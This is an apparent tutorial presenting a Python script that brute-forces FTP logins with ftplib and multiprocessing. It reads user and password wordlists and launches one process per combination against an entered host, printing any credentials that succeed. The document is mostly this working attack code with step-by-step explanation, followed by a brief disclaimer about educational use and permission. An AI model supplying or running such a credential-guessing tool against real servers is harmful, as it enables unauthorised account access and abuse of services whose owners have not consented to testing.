### FTP Brute Force Script Using `ftplib` and `multiprocessing`

This Python script performs FTP brute-force attacks using the `ftplib` module for FTP operations and `multiprocessing` for parallel execution.

### 1. Importing Required Modules:

```python
import ftplib
import multiprocessing
```

The script imports the `FTP` class from the `ftplib` module for FTP client operations and `multiprocessing` for parallel execution.

### 2. FTP Brute Force Function:

```python
def brute_force(ip_address, user, password):
    ftp = ftplib.FTP(ip_address)
    try:
        print("Testing user {}, password {}".format(user, password))
        response = ftp.login(user, password)
        if "230" in response and "access granted" in response:
            print("[*]Successful brute force")
            print("User: " + user + " Password: " + password)
        else:
            pass
    except Exception as exception:
        print('Connection error', exception)
```

The `brute_force` function attempts to log in to the FTP server with the specified user and password. If the login is successful, it prints a success message along with the user and password.

### 3. Main Function:

```python
def main():
    ip_address = input("Enter IP address or host name:")
    with open('users.txt', 'r') as users:
        users = users.readlines()
    with open('passwords.txt', 'r') as passwords:
        passwords = passwords.readlines()
    for user in users:
        for password in passwords:
            process = multiprocessing.Process(target=brute_force,
                                              args=(ip_address, user.rstrip(), password.rstrip(),))
            process.start()

if __name__ == '__main__':
    main()
```

The `main` function reads usernames and passwords from respective files (`users.txt` and `passwords.txt`). It then iterates over the combinations, spawning a new process for each combination to perform FTP brute-force attacks concurrently.

### Note:

- This script is for educational purposes only, and unauthorized access attempts are illegal.
- Use this script only on systems you have permission to test.
- Always ensure that you comply with the applicable laws and ethical guidelines while performing security testing.
